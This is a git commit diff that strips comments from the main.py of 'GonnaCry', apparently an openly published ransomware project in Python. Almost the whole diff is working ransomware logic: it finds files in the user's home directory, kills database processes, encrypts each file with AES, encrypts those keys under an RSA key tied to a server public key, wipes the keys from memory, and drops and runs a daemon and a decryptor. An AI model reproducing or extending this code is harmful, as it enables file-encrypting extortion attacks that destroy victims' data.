4064f355539a8e4ec10bfc1d97341b8ea343f04a
tarcisio <tarcisio_marinho09@hotmail.com>
2019-09-01 14:10:32 -0300

    Removing comments

--- Python/GonnaCry/main.py
+++ Python/GonnaCry/main.py
@@ -51,7 +51,6 @@ def start_encryption(files):
         
         found_file = base64.b64decode(found_file)
 
-        # try open the file to encrypt it
         try:
             with open(found_file, 'rb') as f:
                 file_content = f.read()
@@ -67,28 +66,23 @@ def start_encryption(files):
 
         base64_new_file_name = base64.b64encode(new_file_name)
 
-        # list of tuples of AES_key and base64(path)
         AES_and_base64_path.append((key, base64_new_file_name))
     
     return AES_and_base64_path
 
 
 def menu():
-    # create ransomware directory 
     try:
         os.mkdir(variables.ransomware_path)
     except OSError:
         pass
 
-    # killing running database process
     kill_databases()
         
-    # get the files in the home directory
-    # /home/$USER
     files = get_files.find_files(variables.test)
     for f in files:
         print(f)
-    # create RSA object
+
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
     
@@ -97,24 +91,21 @@ def menu():
     encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                     variables.server_public_key)
     
-    # save encrypted client private key to disk
     with open(variables.encrypted_client_private_key_path, 'wb') as output:
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
     
-    # save client public key to disk
     with open(variables.client_public_key_path, 'wb') as f:
         f.write(Client_public_key)
     
-    # Free the memory from keys
     Client_private_key = None
     rsa_object = None
     del rsa_object
     del Client_private_key
     gc.collect()
     
-    # Get the client public key back as object
     client_public_key_object =  RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
+
 
     # FILE ENCRYPTION STARTS HERE !!!
     aes_keys_and_base64_path = start_encryption(files)
@@ -124,16 +115,13 @@ def menu():
         aes_key = _[0]
         base64_path = _[1]
 
-        # encrypt with the client public key
         encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
         enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
     
-    # free the old AES keys
     aes_keys_and_base64_path = None
     del aes_keys_and_base64_path
     gc.collect()
 
-    # save to disk -> ENC(AES) BASE64(PATH)
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
             line = base64.b64encode(_[0]) + " " + _[1] + "\n"
@@ -145,7 +133,6 @@ def menu():
 
 
 def drop_daemon_and_decryptor():
-    
     with open(variables.decryptor_path,'wb') as f:
         f.write(base64.b64decode(variables.decryptor))
 
@@ -155,8 +142,6 @@ def drop_daemon_and_decryptor():
     os.chdir(variables.ransomware_path)
     os.system('chmod +x daemon')
     os.system('chmod +x decryptor')
-    
-    # run deamon 
     os.system('./daemon')
 
 
